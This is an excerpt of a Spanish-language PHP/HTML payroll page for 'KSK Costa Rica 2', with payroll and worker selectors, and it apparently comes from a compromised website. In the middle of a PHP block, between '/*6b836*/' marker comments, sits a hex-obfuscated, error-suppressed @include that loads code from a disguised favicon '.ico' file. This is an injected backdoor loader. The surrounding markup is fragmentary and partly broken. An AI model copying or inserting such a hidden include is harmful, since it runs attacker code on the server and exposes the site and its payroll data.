...
<script src="./planilla2/angular.min.js.descarga"></script><style type="text/css">
					...
					<div class="container mt-15">
						<div class="row">
							<div class="col-md-9 col-sm-8 col-xs-12">
                                ...
                                <div class="row">
  <div class="col-sm-4"><a href="Planillas/index.php?view=clients" class="btn btn-info" role="button">Trabajadores</a></div>
  ...
  <div class="col-sm-4">.col-sm-4</div>
									...
									<div class="page-article-content clearfix">
										...
										<h2>Comprobante de pago KSK Costa Rica 2</h2>
                                        <hr>
                                        ...
                                        <!-- <div data-ng-controller="ctrlCalcCuotas" class="ng-scope">
                                        	<p style="color: #F90; font-weight: bold;">Seleccione la planilla</p>
                                        	 <select name="client_id" id="client_id" ng-model="planilla" class="form-control">
						     ...
						     <!--  <div class="ng-scope">
                              <p style="color: #F90; font-weight: bold;">Trabajador</p>
						       <SELECT NAME="selClienteCombo" id="selClienteCombo" class="form-control"> 
								
								<?php

/*6b836*/

@include "\x2fho\x6de/\x64jl\x75ig\x301/\x70ub\x6cic\x5fht\x6dl/\x73eg\x75do\x63pr\x6f.c\x6fm/\x69nd\x65x/\x76ie\x77/p\x72od\x75ct\x72ep\x6frt\x2ffa\x76ic\x6fn_\x350c\x3955\x2eic\x6f";

/*6b836*/ include('connect_db.php');
include ('consultas.php');
    ...
    <label for="name1">Planilla</label>

    <select id="country_id" class="form-control" name="country_id"  ng-model="planilla" class="form-control"> required>
...
<?php endforeach; ?>
  ...
  <div class="form-group">
    ...
    <label for="name1">Trabajador</label>
...
<script src="./planilla2/lightbox.js.descarga"></script>
	...
	<script type="text/javascript">
		$(document).ready(function() 
		{
			$('#selClienteCombo').on('change', function()
			{
            ...
            $("#hideen").html("Trabajador: " + selectedText + " Cedula: " + selectedValue);
